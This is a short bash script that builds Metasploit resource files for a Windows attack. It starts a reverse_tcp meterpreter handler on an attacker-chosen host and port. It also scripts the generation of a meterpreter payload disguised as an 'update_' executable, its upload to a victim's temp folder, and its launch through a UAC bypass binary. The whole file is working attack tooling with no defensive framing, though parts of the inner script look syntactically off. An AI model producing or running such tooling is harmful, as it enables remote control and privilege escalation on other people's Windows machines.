#!/bin/bash
[ -z "$1" ] || [ -z "$2" ] && { echo "Usage: $0 <port> <lhost>" >&2; exit 1; }
PORT="$1"; LHOST="$2"
OUTFILE="/tmp/acheron_listener_${PORT}.rc"
BYPASS_RC="/tmp/bypassuac.rc"

# Generate dynamic bypass UAC script with LHOST/LPORT
cat > "/tmp/bypassuac.rc" << 'EOF'
# UAC Bypass Method 59 - Debug Object / PPID Spoofing
# Run MANUALLY in meterpreter: bypassuac

# Generate random payload name
set PAYLOAD_NAME update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe

# Generate new Acheron payload with same LHOST/LPORT
run generate -f exe -o /tmp/$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT

# Upload to victim %TEMP%
upload /tmp/$PAYLOAD_NAME %TEMP%\$PAYLOAD_NAME

# Execute UAC bypass executable with our payload
execute -f C:\Windows\Temp\uacbypass.exe -a "%TEMP%\$PAYLOAD_NAME" -H -i

# Clean up
rm /tmp/$PAYLOAD_NAME
EOF

cat > "$OUTFILE" << RC
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false
set EnableStageEncoding true

exploit -j -z
RC

# Removed alias script generation - user will run bypassuac manually
echo "[*] Run: msfconsole -r \$OUTFILE" >&2
echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc)" >&2
